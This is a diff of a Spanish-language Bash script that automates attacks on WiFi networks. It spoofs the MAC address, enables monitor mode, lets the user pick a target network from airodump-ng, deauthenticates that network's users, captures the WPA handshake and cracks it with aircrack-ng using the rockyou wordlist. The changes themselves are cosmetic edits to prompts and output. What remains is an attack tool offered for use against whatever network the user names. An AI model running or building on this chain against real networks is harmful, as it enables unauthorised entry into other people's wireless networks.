@@ -52,14 +52,14 @@ if [ $airtest -eq 0 ]; then
 			airmon-ng check kill > /dev/null 2>&1
 			echo -e "\n${yellowColour}[*] Nueva dirección MAC asignada: $(macchanger -s ${tar}mon | grep -i current | xargs | cut -d ' ' -f '3-100')"
 			echo -e "\n${greenColour}[*] Ya tienes tu tarjeta preparada!"
-			read -p "Quieres hacer un ataque? [Y/N]: " rps
+			read -p "[?]Quieres hacer un ataque? [Y/N]: " rps
 				$cleancolor
 				if [ "$rps" == "Y" ] || [ "$rps" == "y" ]; then
 					xterm -hold -e "airodump-ng ${tar}mon" &
 					airodump_xterm_PID=$!
-					read -p "Que red deseas atacar?: " ap
-					read -p "En que canal esta ${ap}?: " channel
-
+					read -p "[?] Que red deseas atacar?: " ap
+					read -p "[?] En que canal esta ${ap}?: " channel
+					echo - "${greenColour}[*] Se esta desautenticando a los usuarios de la red"
 					kill -9 $airodump_xterm_PID
 					wait $airodump_xterm_PID 2>/dev/null
 
@@ -74,13 +74,12 @@ if [ $airtest -eq 0 ]; then
 					wait $airodump_filter_xterm_PID 2>/dev/null
 					
 					cd /usr/share/wordlists
-					sudo gunzip -d rockyou.txt.gz
+					sudo gunzip -d rockyou.txt.gz > /dev/null 2>&1
 					
-					sleep 5; xterm -hold -e "aircrack-ng -w /usr/share/wordlists/rockyou.txt Handshake-01.cap" &
-					
+					sleep 5; xterm -hold -e "aircrack-ng -w /usr/share/wordlists/rockyou.txt Handshake-01.cap"
 				fi
 			if [ "$rps" == "N" ] || [ "$rps" == "n" ]; then
-				echo -e "${redColour}\n[*] Saliendo"
+				echo -e "${redColour}\n[!] Saliendo"
 				$cleancolor
 				break
 			fi
